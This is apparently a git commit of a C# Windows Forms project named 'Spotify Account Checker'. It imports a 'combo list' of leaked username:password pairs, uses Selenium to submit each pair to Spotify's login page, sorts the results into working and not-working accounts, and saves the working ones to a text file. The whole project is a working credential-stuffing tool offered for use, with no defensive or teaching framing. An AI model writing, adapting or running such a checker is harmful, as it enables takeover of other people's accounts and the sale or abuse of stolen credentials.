f1044a4f3a54cb8638ec455cfbafb1108bc3511f
Unknown <cmesina@parrastu.catholic.edu.au>
2017-01-28 10:56:58 +1100

    Start

---
+++ Spotify Account Checker/Form1.Designer.cs
@@ -0,0 +1,278 @@
+﻿namespace Spotify_Account_Checker
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.listBox1 = new System.Windows.Forms.ListBox();
+            this.button4 = new System.Windows.Forms.Button();
+            this.groupBox2 = new System.Windows.Forms.GroupBox();
+            this.button5 = new System.Windows.Forms.Button();
+            this.listBox2 = new System.Windows.Forms.ListBox();
+            this.groupBox3 = new System.Windows.Forms.GroupBox();
+            this.listBox3 = new System.Windows.Forms.ListBox();
+            this.groupBox4 = new System.Windows.Forms.GroupBox();
+            this.label6 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label1 = new System.Windows.Forms.Label();
+            this.progressBar1 = new System.Windows.Forms.ProgressBar();
+            this.groupBox1.SuspendLayout();
+            this.groupBox2.SuspendLayout();
+            this.groupBox3.SuspendLayout();
+            this.groupBox4.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(12, 12);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(209, 53);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Import Combo List";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(228, 12);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(412, 53);
+            this.button2.TabIndex = 1;
+            this.button2.Text = "Start Check";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.listBox1);
+            this.groupBox1.Location = new System.Drawing.Point(12, 71);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(640, 279);
+            this.groupBox1.TabIndex = 3;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "Combo list";
+            // 
+            // listBox1
+            // 
+            this.listBox1.FormattingEnabled = true;
+            this.listBox1.ItemHeight = 25;
+            this.listBox1.Location = new System.Drawing.Point(6, 30);
+            this.listBox1.Name = "listBox1";
+            this.listBox1.Size = new System.Drawing.Size(628, 179);
+            this.listBox1.TabIndex = 4;
+            // 
+            // button4
+            // 
+            this.button4.Location = new System.Drawing.Point(18, 286);
+            this.button4.Name = "button4";
+            this.button4.Size = new System.Drawing.Size(628, 58);
+            this.button4.TabIndex = 4;
+            this.button4.Text = "Clear Items";
+            this.button4.UseVisualStyleBackColor = true;
+            this.button4.Click += new System.EventHandler(this.button4_Click);
+            // 
+            // groupBox2
+            // 
+            this.groupBox2.Controls.Add(this.button5);
+            this.groupBox2.Controls.Add(this.listBox2);
+            this.groupBox2.Location = new System.Drawing.Point(12, 356);
+            this.groupBox2.Name = "groupBox2";
+            this.groupBox2.Size = new System.Drawing.Size(640, 279);
+            this.groupBox2.TabIndex = 5;
+            this.groupBox2.TabStop = false;
+            this.groupBox2.Text = "Working";
+            // 
+            // button5
+            // 
+            this.button5.Location = new System.Drawing.Point(12, 215);
+            this.button5.Name = "button5";
+            this.button5.Size = new System.Drawing.Size(622, 58);
+            this.button5.TabIndex = 8;
+            this.button5.Text = "Save working accounts to text file.";
+            this.button5.UseVisualStyleBackColor = true;
+            this.button5.Click += new System.EventHandler(this.button5_Click);
+            // 
+            // listBox2
+            // 
+            this.listBox2.FormattingEnabled = true;
+            this.listBox2.ItemHeight = 25;
+            this.listBox2.Location = new System.Drawing.Point(12, 30);
+            this.listBox2.Name = "listBox2";
+            this.listBox2.Size = new System.Drawing.Size(622, 179);
+            this.listBox2.TabIndex = 5;
+            // 
+            // groupBox3
+            // 
+            this.groupBox3.Controls.Add(this.listBox3);
+            this.groupBox3.Location = new System.Drawing.Point(12, 641);
+            this.groupBox3.Name = "groupBox3";
+            this.groupBox3.Size = new System.Drawing.Size(640, 279);
+            this.groupBox3.TabIndex = 6;
+            this.groupBox3.TabStop = false;
+            this.groupBox3.Text = "Not Working";
+            // 
+            // listBox3
+            // 
+            this.listBox3.FormattingEnabled = true;
+            this.listBox3.ItemHeight = 25;
+            this.listBox3.Location = new System.Drawing.Point(6, 30);
+            this.listBox3.Name = "listBox3";
+            this.listBox3.Size = new System.Drawing.Size(622, 229);
+            this.listBox3.TabIndex = 6;
+            // 
+            // groupBox4
+            // 
+            this.groupBox4.Controls.Add(this.label6);
+            this.groupBox4.Controls.Add(this.label5);
+            this.groupBox4.Controls.Add(this.label4);
+            this.groupBox4.Controls.Add(this.label3);
+            this.groupBox4.Controls.Add(this.label2);
+            this.groupBox4.Controls.Add(this.label1);
+            this.groupBox4.Controls.Add(this.progressBar1);
+            this.groupBox4.Location = new System.Drawing.Point(658, 12);
+            this.groupBox4.Name = "groupBox4";
+            this.groupBox4.Size = new System.Drawing.Size(470, 338);
+            this.groupBox4.TabIndex = 7;
+            this.groupBox4.TabStop = false;
+            this.groupBox4.Text = "Status";
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Location = new System.Drawing.Point(129, 100);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(30, 25);
+            this.label6.TabIndex = 6;
+            this.label6.Text = "...";
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Location = new System.Drawing.Point(129, 59);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(30, 25);
+            this.label5.TabIndex = 5;
+            this.label5.Text = "...";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(6, 100);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(112, 25);
+            this.label4.TabIndex = 4;
+            this.label4.Text = "Password:";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(6, 59);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(116, 25);
+            this.label3.TabIndex = 3;
+            this.label3.Text = "Username:";
+            // 
+            // label2
+            // 
+            this.label2.Location = new System.Drawing.Point(364, 254);
+            this.label2.Name = "label2";
+            this.label2.RightToLeft = System.Windows.Forms.RightToLeft.No;
+            this.label2.Size = new System.Drawing.Size(100, 23);
+            this.label2.TabIndex = 2;
+            this.label2.Text = "0/0";
+            this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(6, 27);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(201, 25);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Currently Checking:";
+            // 
+            // progressBar1
+            // 
+            this.progressBar1.Location = new System.Drawing.Point(6, 280);
+            this.progressBar1.Name = "progressBar1";
+            this.progressBar1.Size = new System.Drawing.Size(458, 42);
+            this.progressBar1.TabIndex = 0;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(12F, 25F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(1140, 933);
+            this.Controls.Add(this.groupBox4);
+            this.Controls.Add(this.groupBox3);
+            this.Controls.Add(this.groupBox2);
+            this.Controls.Add(this.button4);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Name = "Form1";
+            this.Text = "Spotify Account Checker";
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox2.ResumeLayout(false);
+            this.groupBox3.ResumeLayout(false);
+            this.groupBox4.ResumeLayout(false);
+            this.groupBox4.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.ListBox listBox1;
+        private System.Windows.Forms.Button button4;
+        private System.Windows.Forms.GroupBox groupBox2;
+        private System.Windows.Forms.GroupBox groupBox3;
+        private System.Windows.Forms.GroupBox groupBox4;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.ProgressBar progressBar1;
+        private System.Windows.Forms.Button button5;
+        private System.Windows.Forms.ListBox listBox2;
+        private System.Windows.Forms.ListBox listBox3;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.Label label5;
+    }
+}
+
---
+++ Spotify Account Checker/Form1.cs
@@ -0,0 +1,266 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using OpenQA.Selenium;
+using OpenQA.Selenium.Chrome;
+using OpenQA.Selenium.Firefox;
+using System.Runtime.InteropServices;
+using System.Threading;
+using OpenQA.Selenium.Remote;
+
+namespace Spotify_Account_Checker
+{
+    public partial class Form1 : Form
+    {
+        //selenium webdriver
+        
+        ChromeOptions options = new ChromeOptions();
+        IWebDriver driver = new ChromeDriver();
+      
+        public Form1()
+        {
+            InitializeComponent();
+
+        }
+
+     
+
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            //Import combo list into listbox
+            try
+            {
+                OpenFileDialog f = new OpenFileDialog();
+                if (f.ShowDialog() == DialogResult.OK)
+                {
+                    listBox1.Items.Clear();
+                    List<string> lines = new List<string>();
+                    using (StreamReader r = new StreamReader(f.OpenFile()))
+                    {
+                        string line;
+                        while ((line = r.ReadLine()) != null)
+                        {
+                            listBox1.Items.Add(line);
+                        }
+                    }
+
+                }
+                int i = listBox1.Items.Count;
+                int progress = 0;
+                label2.Text = "0" + "/" + i;
+                progressBar1.Maximum = i;
+                Console.WriteLine("Successfully Imported the list!");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("An error occurred when importing the list. '{0}'", ex);
+            }
+           
+        }
+
+        public async Task login(string user, string password)
+        {
+            //navigate to spotify login page
+            Console.WriteLine("Loading Spotify Login Page");
+            driver.Manage().Cookies.DeleteAllCookies();
+            driver.Navigate().GoToUrl("https://accounts.spotify.com/en/login");
+            Console.WriteLine("Waiting for page load...");
+            driver.Manage().Timeouts().ImplicitlyWait(TimeSpan.FromSeconds(30));
+            Console.WriteLine("Page successfully loaded!");
+            Console.WriteLine("Begin check");
+            Console.WriteLine("Sending " + user + " to browser");
+            driver.FindElement(By.Id("login-username")).Clear();
+            driver.FindElement(By.Id("login-username")).SendKeys(user);
+            Thread.Sleep(200);
+            Console.WriteLine("Sending " + password + " to browser");
+            driver.FindElement(By.Id("login-password")).Clear();
+            driver.FindElement(By.Id("login-password")).SendKeys(password);
+            Thread.Sleep(200);
+            Console.WriteLine("Submitting Login...");
+            driver.FindElement(By.Id("login-password")).SendKeys(OpenQA.Selenium.Keys.Enter);
+            Thread.Sleep(1000);
+            Console.WriteLine("Waiting for page load...");
+            driver.Manage().Timeouts().ImplicitlyWait(TimeSpan.FromSeconds(30));
+            Console.WriteLine("Page loaded, checking if successfull");
+            
+
+
+        }
+
+       
+        public async Task<bool?> check_()
+        {
+           
+                IWebElement body = driver.FindElement(By.TagName("body"));
+                if (body.Text.Contains("Incorrect"))
+                {
+                    return false;
+                }
+                else if (body.Text.Contains("logged"))
+                {
+                    return true;
+                }
+                else
+                {
+                    return null;
+
+                }
+            
+           
+        }
+
+    
+
+
+        private async void button2_Click(object sender, EventArgs e)
+        {
+            int i = listBox1.Items.Count;
+            int progress = 0;
+            label2.Text = "0" + "/" + i;
+            progressBar1.Maximum = i;
+            int retries = 0;
+            foreach (string item in listBox1.Items)
+            {
+            code_start:
+                string[] user = item.Split(new String[] { ":" }, StringSplitOptions.None);
+                label5.Text = user[0];
+                label6.Text = user[1];
+                //check if proxies is enabled
+
+
+                Task task = Task.Run(() => login(user[0], user[1]));
+                await task;
+
+
+
+                Task<bool?> check = Task<bool?>.Run(() => check_());
+                bool? working = await check;
+
+                if (working == true)
+                {
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine(user[0] + " " + user[1] + " is a working account");
+                    Console.ResetColor();
+                    listBox2.Items.Add(item);
+                }
+                else if (working == false)
+                {
+                    Console.ForegroundColor = ConsoleColor.DarkYellow;
+                    Console.WriteLine(user[0] + " " + user[1] + "is not working");
+                    Console.ResetColor();
+                    listBox3.Items.Add(item);
+                }
+                else if (working == null)
+                {
+
+                    while (retries < 5)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("Cannot Determine, Rechecking... (" + retries + ")");
+                        Console.ResetColor();
+                        retries = retries + 1;
+                        goto code_start;
+
+                    }
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("Maximum retries reached. Assumming account is not valid.");
+                    Console.ResetColor();
+                    listBox3.Items.Add(item);
+
+
+                }
+
+
+                progress = progress + 1;
+                progressBar1.Value = progress;
+                label2.Text = progress + "/" + i;
+                groupBox2.Text = "Working " + "(" + listBox2.Items.Count + ")";
+                groupBox3.Text = " Not Working " + "(" + listBox3.Items.Count + ")";
+
+            }
+            
+
+            MessageBox.Show("Check Completed. Have found " + listBox2.Items.Count + " working accounts and " + listBox3.Items.Count + " invalid accounts");
+            progressBar1.Value = 0;
+            label2.Text = "0" + "/" + i;
+            
+        }
+
+        public static void ShowConsoleWindow()
+        {
+            var handle = GetConsoleWindow();
+
+            if (handle == IntPtr.Zero)
+            {
+                AllocConsole();
+            }
+            else
+            {
+                ShowWindow(handle, SW_SHOW);
+            }
+        }
+
+        public static void HideConsoleWindow()
+        {
+            var handle = GetConsoleWindow();
+
+            ShowWindow(handle, SW_HIDE);
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool AllocConsole();
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            ShowConsoleWindow();
+            Console.WriteLine("Application Successfully Loaded!");
+            
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            driver.Quit();
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            var saveFile = new SaveFileDialog();
+            saveFile.Filter = "Text (*.txt)|*.txt";
+            if (saveFile.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+            {
+                using (var sw = new StreamWriter(saveFile.FileName, false))
+                    foreach (var item in listBox2.Items)
+                        sw.Write(item.ToString() + Environment.NewLine);
+                
+            }
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            listBox1.Items.Clear();
+        }
+
+       
+
+    
+    }
+}
+    
+
